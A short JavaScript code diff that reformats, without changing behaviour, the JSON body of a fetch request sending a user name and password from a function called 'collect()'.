@@ -13,7 +13,9 @@ function collect() {
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ user_name: eValue, pass: pValue}),
+            body: JSON.stringify({ 
+                user_name: eValue, 
+                pass: pValue}),
         })
         .then(response => response.json())
         .then(data => {
